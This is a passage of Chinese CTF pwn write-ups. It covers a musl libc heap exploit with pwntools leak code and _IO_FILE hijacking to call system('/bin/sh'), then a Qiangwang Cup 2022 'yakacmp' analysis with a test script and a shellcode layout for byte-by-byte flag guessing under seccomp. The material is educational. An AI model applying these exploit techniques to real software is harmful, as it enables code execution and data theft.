class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">check(<span class="number">11</span>)</span><br></pre></td></tr></table></figure><p>由此，我们就成功获取了堆空间地址，进而得到了程序加载的基地址。</p><h3 id="Step-2-获取libc加载基地址"><a href="#Step-2-获取libc加载基地址" class="headerlink" title="Step 2: 获取libc加载基地址"></a>Step 2: 获取libc加载基地址</h3><p>下一步，我们就需要想办法读取到程序中保存的<code>stdout</code>的值，以获取libc的基地址。由于在正常情况下堆地址不会分配到那个地方，因此我们需要能够修改根节点的结构体本身。可行的方法是：分配掉5个chunk，之后分配根节点，根节点的<code>name</code>大小也为0x38。然后我们重新分配根节点，释放前面的一个结点。此时7个chunk中一共就有3个被释放，依次是前面的一个chunk、原根节点结构体chunk、原根节点<code>name</code>的chunk。当我们此时再一次分配一个chunk，且将<code>name</code>的大小也设置为0x38时，我们就能够将<code>name</code>的chunk申请到原根节点结构体，从而直接修改原根节点结构体中<code>name</code>指针的值。不过需要注意的是，本题中添加和删除的操作较为复杂，随意修改三个二叉树指针很可能会导致程序崩溃退出，但经过调试发现，指针的值相对于elf文件加载地址的偏移始终不变。我们在上一步已经知道了elf的加载地址，因此我们在写的时候可以不修改指针的值，而是只修改<code>name</code>指针的值，避免程序崩溃。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x38</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(stdout)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x51e0</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x50e0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x38</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(stdout)</span><br><span class="line">payload += p64(<span class="number">0x38</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5120</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5160</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x38</span>, payload)</span><br><span class="line">check(<span class="number">11</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7b575be7203b45b1a1d93a5164039118.png"><br>成功获取<code>stdout</code>的值。</p><h3 id="Step-3-获取-malloc-context结构体中的secret值"><a href="#Step-3-获取-malloc-context结构体中的secret值" class="headerlink" title="Step 3: 获取__malloc_context结构体中的secret值"></a>Step 3: 获取<code>__malloc_context</code>结构体中的<code>secret</code>值</h3><p>和第二步相同，我们如法炮制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x38</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(__malloc_context)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x51e0</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x50e0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x38</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(__malloc_context)</span><br><span class="line">payload += p64(<span class="number">0x38</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5120</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5160</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x38</span>, payload)</span><br><span class="line">check(<span class="number">11</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7f04ef506ac34b93ad1a8d81a80a03c8.png"><br>成功获取<code>secret</code>值。</p><h3 id="Step-4-申请大空间，伪造meta-area-meta-group-chunk"><a href="#Step-4-申请大空间，伪造meta-area-meta-group-chunk" class="headerlink" title="Step 4: 申请大空间，伪造meta_area, meta, group, chunk"></a>Step 4: 申请大空间，伪造<code>meta_area, meta, group, chunk</code></h3><p>现在，我们已经掌握了伪造chunk并释放所需的所有数据了，因此可以开始伪造相关结构了。对于musl libc pwn来说，从meta_area这个外层结构一直伪造到chunk这个最内层结构是较为常见的操作。我们通过伪造这些结构调用到<code>dequeue</code>这个函数实现类似于glibc中unlink的利用。在本题中，我们可以通过分配一个大于0x1000的chunk来完成伪造（因为所有<code>meta_area</code>必须页对齐）。经过调试发现，当我们分配一个大chunk时，musl libc会为我们开辟一块新的空间专门用于存放，这个空间是一个 **<code>group</code>**。因此实际上开始写的地址后12比特应该为<code>0x030</code>。我们跳过本页，在下一页进行伪造。</p><p>经过调试发现，用于保存大chunk的group分配到的mmap空间就在libc加载地址的正下方，大小为0x5000。因此我们可以获取到这块空间的地址，并在假的<code>meta</code>结构中写入假的<code>group</code>地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"><span class="type">int</span> (*close)(FILE *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"><span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line"><span class="type">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="type">long</span> lockcount;</span><br><span class="line"><span class="type">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line"><span class="type">int</span> lbf;</span><br><span class="line"><span class="type">void</span> *cookie;</span><br><span class="line"><span class="type">off_t</span> off;</span><br><span class="line"><span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line"><span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是musl libc中的<code>_IO_FILE</code>结构体，一般的利用方式是伪造一个假的<code>_IO_FILE</code>结构体，将<code>read</code>、<code>write</code>、<code>close</code>、<code>seek</code>函数指针覆写。注意，musl libc中没有one_gadget，因此我们只能将函数指针改写为<code>system</code>函数的地址，将<code>_IO_FILE</code>开头改写为字符串<code>/bin/sh</code>。</p><p>这一部分看起来容易，实际上不简单，需要我们经过反复调试才能成功unlink假的<code>meta</code>。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2022 pwn 赛题解析——yakacmp</title>
      <link href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94yakacmp/"/>
      <url>/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94yakacmp/</url>
      
        <content type="html"><![CDATA[<p>这道题在比赛中是笔者的队友负责的，但可惜的是最后的flag差了几秒没交上。这里借用一下他的exp做一篇分析文章。</p><p>这是一个用C++写的vm题，内部实现了各种指令到机器码的转换功能。下面就来分块分析一下。</p><h1 id="Step-1-分析main函数"><a href="#Step-1-分析main函数" class="headerlink" title="Step 1: 分析main函数"></a>Step 1: 分析main函数</h1><h2 id="Segment-1"><a href="#Segment-1" class="headerlink" title="Segment 1"></a>Segment 1</h2><p><img src="https://img-blog.csdnimg.cn/70a20c787f6d40f086b9e7529625fef3.png"><br>这是加法指令识别与转换的部分代码。转换为机器码的主要流程在<code>func_add</code>函数。通过前面一部分的几个检查，我们可以知道这里要求的加法指令格式为：<code>add r?, r?</code>，其中<code>?</code>为1~4。通过对<code>func_add</code>函数中机器码的识别可知，这里的寄存器对应关系为：<code>r1=rax, r2=rbx, r3=rcx, r4=rdx</code>。注意 <strong><code>func_add</code>函数处理的是寄存器与寄存器相加的指令</strong>，而对于寄存器与立即数相加的指令，则在最后一个部分进行处理，经过调试验证可知，如果第二个操作数是立即数，则立即数不能大于10，否则会立即退出。如果立即数不大于10，那么就会相应插入对应数量的<code>inc</code>指令，这也是上图最下面的<code>func_inc</code>的功能：生成<code>inc rax/rbx/rcx/rdx</code>指令。</p><h2 id="Segment-2"><a href="#Segment-2" class="headerlink" title="Segment 2"></a>Segment 2</h2><p><img src="https://img-blog.csdnimg.cn/3dec0044240e4e89b2612ba5c0f0d5a8.png"><br>这一块是处理减法的相关指令，和加法几乎相同。其中<code>func_sub</code>函数用于生成寄存器与寄存器之间的减法指令，而<code>func_dec</code>用于生成寄存器和立即数之间的减法指令。这里的立即数同样不能大于10。</p><h2 id="Segment-3"><a href="#Segment-3" class="headerlink" title="Segment 3"></a>Segment 3</h2><p><img src="https://img-blog.csdnimg.cn/49d30bf09e7640a9b9705e9085da38c8.png"><br>这一部分是用于处理<code>chg</code>指令的代码，不过在<code>func_chg</code>中的具体实现并不是将指令转换为<code>xchg</code>的机器码，而是使用了两次<code>push</code>和两次<code>pop</code>指令来实现交换。如要实现<code>chg rax, rbx</code>，则<code>func_chg</code>函数会转换为<code>push rax ; push rbx ; pop rax ; pop rbx</code>。</p><h2 id="Segment-4"><a href="#Segment-4" class="headerlink" title="Segment 4"></a>Segment 4</h2><p><img src="https://img-blog.csdnimg.cn/2bfa8d1c63644996a14cf370eb811377.png"><br>这一部分只调用了<code>func_ret</code>这个函数，因此判断这是用于构造一个<code>ret</code>指令的代码片段。但在最后的部分中有一个对<code>v12</code>的判断。简单看一下<code>sub_44B0</code>函数可以知道这个函数内部的函数调用关系极为复杂，不可能通过手动静态分析的方式获取代码语义。而且在其中还存在有很多下图中的这种逻辑非常简单的函数。因此可以尝试使用动态调试的方式猜测这个函数的具体功能。我们先往下看。</p><p><img src="https://img-blog.csdnimg.cn/89249aca26284050847ea81a2a7da6bb.png"></p><h2 id="Segment-5"><a href="#Segment-5" class="headerlink" title="Segment 5"></a>Segment 5</h2><p><img src="https://img-blog.csdnimg.cn/cfce3ac479c848e9a7de5fe77fa13f9d.png"><br>这一个部分的上半段明显有多次调用<code>func_mov</code>函数，判断是为了处理<code>mov r**, r**</code>这样的指令。如果第二个操作数不是寄存器，会判断值是否为0，如果为0就会将<code>mov</code>指令转译为<code>xor</code>指令，含义相同。如果第二个操作数的值不为0，就会进入下面的判断，其中又调用了<code>sub_44B0</code>函数。只有调用结果满足一定条件才会进行下面的指令转译。在条件成立时，程序会将<code>mov reg, imm</code>译为<code>push imm ; pop reg</code>。但无论这段代码是否执行，下面还有一个对<code>func_movabs_8</code>函数的调用，其实现的功能就是<code>mov reg, imm</code>，即如果条件内部的代码能够执行，这里相当于是重复生成了功能相同的指令。通过<code>python</code>脚本进行反汇编发现，并不存在能够<code>push</code>一个<code>QWORD</code>的指令，代码中以<code>0x68</code>开头的指令只能够<code>push</code>一个<code>DWORD</code>入栈。因此这里的指令生成可能存在问题。我们在分析结束后再对这里进行调试检查。</p><h2 id="Segment-6"><a href="#Segment-6" class="headerlink" title="Segment 6"></a>Segment 6</h2><p><img src="https://img-blog.csdnimg.cn/62a246dfba6443baa6e6a72f25655850.png"><br>最后就是一些检查，循环代码的最后一小部分。当循环结束后会依条件选择插入一个<code>ret</code>指令，在执行沙箱后直接执行我们的代码。那么到此为止，我们就分析完了整个main函数的大致流程，可以知道main函数一共实现了<strong>寄存器与寄存器相加&#x2F;减、寄存器与立即数相加&#x2F;减（不大于10）、寄存器交换值、寄存器对寄存器赋值、立即数对寄存器赋值</strong>这5个功能。其中还有一些判断我们没有进行分析，重点就在于<code>sub_44B0</code>函数的分析上。我们通过进行几次调试来判断其功能。</p><h1 id="Step-2-调试发现sub-44B0函数的功能"><a href="#Step-2-调试发现sub-44B0函数的功能" class="headerlink" title="Step 2: 调试发现sub_44B0函数的功能"></a>Step 2: 调试发现<code>sub_44B0</code>函数的功能</h1><h2 id="测试：add-reg-imm-sub-reg-imm-ret"><a href="#测试：add-reg-imm-sub-reg-imm-ret" class="headerlink" title="测试：add reg, imm ; sub reg, imm, ret"></a>测试：<code>add reg, imm ; sub reg, imm, ret</code></h2><p>可以发现在加法和减法的代码块中都各调用了两次<code>sub_44B0</code>函数，而且调用函数之前还会初始化一个字符串。这个字符串就是指令的种类。</p><p><img src="https://img-blog.csdnimg.cn/62e00cf4d6584c1fb16dd4b0a5f03eda.png"><br>这是调用了sub代码最后一个<code>sub_44B0</code>（即图中最下面的这个）函数后其返回值的追踪情况。调试发现，这个函数会返回一个堆指针。<br><img src="https://img-blog.csdnimg.cn/10f9cdac8b944c318f2ed4c40151b6b4.png"><br>我们可以发现这里似乎出现了一些有规律的结构。再结合函数调用后的<code>++</code>操作，可以初步判断这里应该有一个类结构，而<code>++</code>操作可能表示的是指令计数器。但是至于为什么要将<code>mov</code>指令的计数器反复清空，目前还不清楚。</p><p>以这种推断，我们来看一下其他代码片段中对于这个函数的调用情况。</p><p>在处理<code>ret</code>指令的代码片段中，一共调用了三次<code>sub_44B0</code>函数。第一次是对<code>mov</code>指令计数器清零，第二次是将<code>ret</code>指令的计数器加1。第三次是判断<code>ret</code>指令个数是否大于0。如果大于0就会直接退出程序。那么这里可以很明显地看出一个逻辑bug。只要我们写入了<code>ret</code>指令，那么程序一定会直接退出（目前来看是这样）。</p><p>在处理<code>mov</code>指令的代码片段中，一共调用了两次<code>sub_44B0</code>函数。第一次是将<code>mov</code>指令的计数器加1，第二次是判断<code>mov</code>指令计数器值是否大于10。如果大于10则会插入<code>push/pop</code>指令。</p><p>在跳出循环之后，还会调用一次该函数判断是否有<code>ret</code>函数。如果没有则进行插入。可见我们并不需要，也不能写入一个<code>ret</code>指令。</p><p>如此，我们就成功获取了<code>sub_44B0</code>函数的大致语义。这也给了我们一些启示：<strong>做题时应该静态调试和动态调试相结合</strong>。</p><h1 id="Step-3-漏洞分析与利用"><a href="#Step-3-漏洞分析与利用" class="headerlink" title="Step 3: 漏洞分析与利用"></a>Step 3: 漏洞分析与利用</h1><p>在第一步分析main代码时我们就发现，程序对于<code>mov</code>指令的处理似乎有些问题。我们通过调试验证一下。</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_add</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;add &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_sub</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;sub &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_chg</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;chg &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_mov</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;mov &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_ret</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_code</span>(<span class="params">code</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;more operation?&#x27;</span>, code)</span><br><span class="line"></span><br><span class="line">code = make_mov(<span class="string">b&#x27;r1&#x27;</span>, <span class="string">b&#x27;r2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;some code now&#x27;</span>, code)</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x5212345678</span>).encode()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3dd0d66d959b4c53b7223b976924f5d0.png"><br>可以看到，这里确实存在问题，有一个能够容纳最多4字节shellcode的空间。问题就出在最后一条语句中的赋值立即数。这里的<code>push</code>只能压入一个<code>DWORD</code>，但代码中却认为能压入一个<code>QWORD</code>，这就导致立即数的高4字节变成了独立的指令，且能够由我们完全控制。由于本题开启了沙箱，因此通过<code>syscall</code>调用<code>execve</code>是不行了，不过我们可以进行文件的相关操作。现在，就让我们来思考一下应该如何构造shellcode。</p><p>通过seccomp-tools可以获取到本题的沙箱：<br><img src="https://img-blog.csdnimg.cn/e56f68ac283c493da680bbf62da6a950.png"><br>可见这里只允许我们进行打开和读操作，不能写。那我们应该如何获取到flag的值呢？阅读了大佬的exp之后，我发现这种利用方式和Web中的SQL时间盲注有几分相似之处。我们不能直接将flag写到控制台，但是我们确实能够获取到flag的值。记得时间盲注的原理就是利用字符比较函数逐字节猜解表名和字段名，这里也是同样的道理：对内存中的flag逐字节猜解。如果相等，则会阻塞一段时间，如果不等，则会直接退出报<code>EOFerror</code>。</p><p>参考现有的shellcode，我们需要将文件名<code>flag</code>或<code>flag.txt</code>压入栈中，然后通过<code>mov</code>指令将<code>rsp</code>的值赋值给其他寄存器。当然程序中并没有实现与<code>rsp</code>有关的指令，这就需要用到上面的4字节自由区域了。实际上如果我们跳转的地址合理，正常的<code>mov</code>指令中的8字节立即数也可以成为我们写入shellcode的地方，毕竟4个字节的空间要是想要组成一个完整的shellcode，还需要考虑跳转指令张勇的2字节，剩下的2字节能写入的shellcode实在有限，因此还需要合理利用<code>mov</code>指令的8字节立即数。考虑到上面提到的逐字节猜解，我们的shellcode需要实现的功能有：</p><ol><li>打开flag文件</li><li>读取flag文件到内存</li><li>每一次循环猜解一个字符，如果猜解正确就让其阻塞或陷入死循环，如果猜解错误就直接退出</li></ol><p>下面我们来尝试实现shellcode。<br>注意：任意4字节代码能够生成必须前面要有连续的至少10个<code>mov</code>语句。</p><p>首先是打开flag文件。笔者采用flag这个文件名进行测试。</p><ol><li>利用<code>mov</code>指令将<code>&quot;flag&quot;</code>字符串写入0x23330000中：<code>movabs rax, 0x67616C66 (&#39;flag&#39;)</code></li><li>写入9个<code>mov</code>指令：<br> (1) 写入<code>jmp</code>后执行的第九段shellcode：<code>mov rax, 0x72ebxxb1188a (mov bl, byte ptr [rax] ; mov cl, xx ; jmp 114)</code><br> (2) 写入<code>jmp</code>后执行的第八段shellcode：<code>mov rax, 0xf0ebdb314858 (pop rax ; xor rbx, rbx ;  ; jmp -16)</code><br> (3) 写入<code>jmp</code>后执行的第七段shellcode：<code>mov rax, 0xefeb23330fxx68 (push 0x23330F00 + i ; jmp -17)</code><br> (4) 写入<code>jmp</code>后执行的第六段shellcode：<code>mov rax, 0xefeb050f58006a (push 0 ; pop rax ; syscall ; jmp -17)</code><br> (5) 写入<code>jmp</code>后执行的第五段shellcode：<code>mov rax, 0xf0eb5a406a5e (pop rsi ; push 0x40 ; pop rdx ; jmp -16)</code><br> (6) 写入<code>jmp</code>后执行的第四段shellcode：<code>mov rax, 0xefeb23330f0068 (push 0x23330F00 ; jmp -17)</code><br> (7) 写入<code>jmp</code>后执行的第三段shellcode：<code>mov rax, 0xefeb5f036a050f (syscall ; push 3 ; pop rdi ; jmp -17)</code><br> (8) 写入<code>jmp</code>后执行的第二段shellcode：<code>mov rax, 0xefeb585f5e006a (push 0 ; pop rsi ; pop rdi ; pop rax ; jmp -17)</code><br> (9) 写入<code>jmp</code>后执行的第一段shellcode：<code>mov rax, 0xeeeb2333000268 (push 0x23330002 ; jmp -17)</code></li><li>写入<code>mov</code>指令，在4字节空间中写入跳转指令跳转到前面一条<code>mov</code>指令的立即数中，在此之前顺便<code>push</code>好<code>rax</code>的值：<code>//push// 0xF1EB00000002 (push 2 ; jmp -15)</code></li><li>写入<code>jmp</code>后执行的第十段shellcode：<code>mov rax, 0xfeeb1875cb38 (cmp bl, cl ; jne 23 ; jmp -2[dead loop])</code></li><li>写入<code>jmp</code>后执行的第十一段shellcode：<code>mov rax ; 0xc3 (ret)</code></li></ol><p>上面的代码中有两处<code>xx</code>，第一处表示猜解的字符，第二处表示猜解的是哪个下标的字符。由此我们可以写出本题的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 